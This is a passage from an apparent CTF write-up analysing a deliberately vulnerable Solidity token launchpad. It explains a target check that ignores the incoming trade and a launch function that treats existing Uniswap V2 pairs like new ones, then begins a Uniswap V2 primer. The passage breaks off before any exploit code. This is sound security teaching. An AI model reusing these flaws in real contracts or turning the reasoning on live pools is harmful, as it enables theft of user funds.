</span></span><span class="line"><span class="cl">    <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InvalidToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">actualLiquidity</span> <span class="o">&gt;=</span> <span class="n">targetGREYRaised</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">revert</span> <span class="n">TargetGREYRaisedReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_buyTokens</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">,</span> <span class="n">minAmountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">_buyTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="k">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Pair</span> <span class="k">storage</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_getAmountOut</span><span class="p">(</span><span class="n">amountIn</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">+=</span> <span class="n">amountIn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span> <span class="o">-=</span> <span class="n">amountOut</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">amountOut</span> <span class="o">&lt;</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientAmountOut</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">grey</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amountIn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">emit</span> <span class="n">TokenBought</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">,</span> <span class="n">amountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">_getAmountOut</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserveIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserveOut</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">amountIn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientAmountIn</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">reserveIn</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">reserveOut</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientLiquidity</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">amountIn</span> <span class="o">*</span> <span class="n">reserveOut</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">reserveIn</span> <span class="o">+</span> <span class="n">amountIn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The main purpose of this feature is to raise funds to launch the created token. Users can buy the <code>Token</code> using <code>GREY</code>, and <code>_buyTokens</code> will adjust the <code>reserve</code> values accordingly. The <code>_getAmountOut</code> function contains the formula to calculate how many <code>Token</code> tokens a user receives based on the current reserves and their <code>GREY</code> input.</p>
<p>Observed that while <code>buyToken</code> tries to prevent users from buying more tokens when the <code>GREY</code> reserve exceeds the target, it only checks the current state before the trade, not accounting for how much the trade itself will increase the reserves. This means <code>reserveGREY</code> can exceed the target, causing <code>actualLiquidity</code> (calculated as <code>reserveGrey - virtualLiquidity</code>) to go above what was intended.</p>
<p>For example, let&rsquo;s say:</p>
<ul>
<li><code>virtualLiquidity</code> = 2 ether</li>
<li><code>targetGREYRaised</code> = 6 ether</li>
<li>Current <code>reserveGREY</code> = 4 ether</li>
</ul>
<p>Then <code>actualLiquidity</code> = <code>reserveGREY</code> - <code>virtualLiquidity</code> = 2 ether</p>
<p>If a user tries to buy tokens with 5 ether of <code>GREY</code>:</p>
<ol>
<li><code>buyTokens</code> checks if current <code>actualLiquidity</code> (2 ether) &lt; <code>targetGREYRaised</code> (6 ether)</li>
<li>The check passes since 2 &lt; 6</li>
<li>After <code>_buyTokens</code> executes, <code>reserveGREY</code> = 9 ether (4 + 5)</li>
<li>This makes the new <code>actualLiquidity</code> = 7 ether (9 - 2)</li>
</ol>
<p>This shows that while the function tries to prevent exceeding the target, <strong>it only checks the current state before the trade</strong>, not accounting for how much the trade itself will increase the reserves. We&rsquo;ll keep this observation in mind.</p>
<p>Let&rsquo;s examine the <code>launchToken</code> function next.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">launchToken</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">uniswapV2Pair</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InvalidToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">actualLiquidity</span> <span class="o">&lt;</span> <span class="n">targetGREYRaised</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">revert</span> <span class="n">TargetGREYRaisedNotReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">delete</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">greyAmount</span> <span class="o">=</span> <span class="n">actualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">tokenAmount</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Burn tokens equal to ratio of reserveGREY removed to maintain constant price
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span> <span class="n">burnAmount</span> <span class="o">=</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">*</span> <span class="n">tokenAmount</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">tokenAmount</span> <span class="o">-=</span> <span class="n">burnAmount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">burn</span><span class="p">(</span><span class="n">burnAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">uniswapV2Pair</span> <span class="o">=</span> <span class="n">uniswapV2Factory</span><span class="p">.</span><span class="n">getPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">uniswapV2Pair</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">uniswapV2Pair</span> <span class="o">=</span> <span class="n">uniswapV2Factory</span><span class="p">.</span><span class="n">createPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">grey</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">,</span> <span class="n">greyAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">,</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xdEaD</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">emit</span> <span class="n">TokenLaunched</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">uniswapV2Pair</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This function checks whether the <code>factory</code> has enough <code>actualLiquidity</code> to be launched. If yes, it will burn some of the <code>tokenAmount</code> to maintain the same price ratio of the pair after launching to Uniswap V2 Pair. An unusual behavior exists in how the function handles the Uniswap pairs. Noticed that <strong>it treats new and existing pairs identically when adding liquidity</strong>. We will look further into the effect of this later, but let&rsquo;s keep it in our mind for now.</p>
<p>Now that we&rsquo;ve skimmed through the main functions of the <code>launchpad</code> contract and identified this key vulnerability, let&rsquo;s check the challenge setup.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">GREY</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/GREY.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">UniswapV2Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/v2-core/UniswapV2Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Token</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Token.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">claimed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// GREY token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">GREY</span> <span class="k">public</span> <span class="n">grey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Challenge contracts
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">UniswapV2Factory</span> <span class="k">public</span> <span class="n">uniswapV2Factory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Factory</span> <span class="k">public</span> <span class="n">factory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="k">public</span> <span class="n">meme</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Deploy the GREY token contract
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">grey</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GREY</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Mint 7 GREY for setup
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">grey</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">7</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Deploy challenge contracts
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">uniswapV2Factory</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UniswapV2Factory</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">factory</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Factory</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">uniswapV2Factory</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">,</span> <span class="mi">6</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Create a meme token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">address</span> <span class="n">_meme</span><span class="p">,)</span> <span class="o">=</span> <span class="n">factory</span><span class="p">.</span><span class="n">createToken</span><span class="p">(</span><span class="s">&#34;Meme&#34;</span><span class="p">,</span> <span class="s">&#34;MEME&#34;</span><span class="p">,</span> <span class="kt">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">meme</span> <span class="o">=</span> <span class="n">Token</span><span class="p">(</span><span class="n">_meme</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Buy 2 GREY worth of MEME
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">grey</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">factory</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">factory</span><span class="p">.</span><span class="n">buyTokens</span><span class="p">(</span><span class="n">_meme</span><span class="p">,</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Note: Call this function to claim 5 GREY for the challenge
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">claim</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">claimed</span><span class="p">,</span> <span class="s">&#34;already claimed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">claimed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">grey</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="mi">5</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Note: Challenge is solved when you have at least 5.965 GREY
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">grey</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">965</span> <span class="kc">ether</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the challenge, in general, the setup of this challenge is related to a contract that wants to launch a <code>MEME</code> coin and then initialize a decentralized exchange that allows users to trade the token (pair of <code>GREY</code> and <code>MEME</code>) via <code>UniswapV2</code>.</p>
<p>Then, the challenge will mint <code>7 ether</code> of <code>GREY</code>, where <code>2 ether</code> of <code>GREY</code> will be used to buy <code>MEME</code> tokens through the <code>factory</code> contract, and <code>5 ether</code> of <code>GREY</code> will be given to the player via the <code>claim()</code> function.</p>
<p>The goal is to increase our <code>GREY</code> balance from <code>5 ether</code> to at least <code>5.965 ether</code> of <code>GREY</code> (about 19.3% profit).</p>
<p>This information from the challenge specification is enough. We can now start to think about what we can do to exploit the challenge so that we can somehow get guaranteed profit.</p>
<h3 id="solution">Solution</h3>
<p>From the initial analysis, recall an important observation we made while examining the <code>launchToken</code> function:</p>
<ul>
<li>The <code>factory</code> can launch the trading pair regardless of whether the pair already exists or not.</li>
</ul>
<h4 id="uniswap-v2-pair-101">Uniswap V2 Pair 101</h4>
<p>Before diving into the solution, let&rsquo;s understand how Uniswap V2 pairs work, particularly focusing on the relation with the previous observation that we discovered.</p>
<p>In Uniswap V2, the initial setup of a trading pair is actually a critical moment. The first liquidity provider has the unique privilege of establishing the starting price ratio between the two tokens. This ratio becomes the foundation that all subsequent trading and liquidity provision will build upon.</p>
<p>To understand this better, let&rsquo;s examine the <code>mint</code> function defined in the Uniswap V2 pair.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">MINIMUM_LIQUIDITY</span> <span class="o">=</span> <span class="mi">10</span><span class="o">**</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span><span class="line"><span class="cl"> <span class="c1">// this low-level function should be called from a contract which performs important safety checks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">)</span> <span class="k">external</span> <span class="n">lock</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">liquidity</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="p">(</span><span class="kt">uint112</span> <span class="n">_reserve0</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">_reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">getReserves</span><span class="p">();</span> <span class="c1">// gas savings
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="kt">uint</span> <span class="n">balance0</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">balance1</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">amount0</span> <span class="o">=</span> <span class="n">balance0</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="n">_reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">amount1</span> <span class="o">=</span> <span class="n">balance1</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="n">_reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="kt">bool</span> <span class="n">feeOn</span> <span class="o">=</span> <span class="n">_mintFee</span><span class="p">(</span><span class="n">_reserve0</span><span class="p">,</span> <span class="n">_reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">_totalSupply</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">;</span> <span class="c1">// gas savings, must be defined here since totalSupply can update in _mintFee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="k">if</span> <span class="p">(</span><span class="n">_totalSupply</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="n">liquidity</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">amount0</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">amount1</span><span class="p">)).</span><span class="n">sub</span><span class="p">(</span><span class="n">MINIMUM_LIQUIDITY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">MINIMUM_LIQUIDITY</span><span class="p">);</span> <span class="c1">// permanently lock the first MINIMUM_LIQUIDITY tokens
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="n">liquidity</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="nb">min</span><span class="p">(</span><span class="n">amount0</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">_totalSupply</span><span class="p">)</span> <span class="o">/</span> <span class="n">_reserve0</span><span class="p">,</span> <span class="n">amount1</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">_totalSupply</span><span class="p">)</span> <span class="o">/</span> <span class="n">_reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl">     <span class="nb">require</span><span class="p">(</span><span class="n">liquidity</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">liquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
